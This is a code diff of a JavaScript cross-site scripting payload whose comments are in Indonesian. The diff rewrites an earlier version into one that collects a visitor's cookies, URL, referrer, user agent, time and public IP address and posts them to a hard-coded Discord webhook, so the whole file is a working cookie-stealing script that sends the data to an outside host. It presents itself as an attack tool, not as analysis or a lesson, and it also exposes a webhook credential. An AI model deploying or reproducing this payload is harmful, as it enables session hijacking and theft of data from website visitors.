@@ -1,22 +1,35 @@
-function discordSend() {
-    var textData = "*XSS Alert di* " + document.domain + "\n" +
-                   "----------------------------\n\n" +
-                   "🌐 URL Target:\n`" + document.location.hostname + document.location.pathname + "`\n\n" +
-                   "🍪 Document Cookie:\n" + document.cookie + "";
+(async () => {
+  const info = {
+    site: document.domain,
+    url: location.href,
+    cookie: document.cookie,
+    userAgent: navigator.userAgent,
+    referer: document.referrer,
+    time: new Date().toLocaleString()
+  };
 
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    var payload = JSON.stringify({ content: textData });
+  try {
+    // Ambil IP korban
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    info.ip = ipData.ip;
+  } catch (err) {
+    info.ip = 'Gagal ambil IP';
+  }
 
-    xhr.send(payload);
+  const fullMessage = `✅ Berhasil konek ke website: ${document.domain}\n\n` +
+                      `*XSS Alert di* ${document.domain}\n` +
+                      `----------------------------\n\n` +
+                      `🌐 URL Target:\n\`${location.hostname}${location.pathname}\`\n\n` +
+                      `🍪 Document Cookie:\n${document.cookie}\n\n` +
+                      `📄 Referer: ${document.referrer}\n` +
+                      `📱 User Agent: ${navigator.userAgent}\n` +
+                      `🌐 IP Address: ${info.ip}\n` +
+                      `⏰ Time: ${info.time}`;
 
-    // Kirim log tambahan "berhasil konek ke website"
-    var xhr2 = new XMLHttpRequest();
-    xhr2.open('POST', 'https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', true);
-    xhr2.setRequestHeader('Content-Type', 'application/json');
-    var payload2 = JSON.stringify({ content: `✅ Berhasil konek ke website: ${document.domain}` });
-    xhr2.send(payload2);
-}
-
-discordSend();
+  fetch('https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: fullMessage })
+  });
+})();
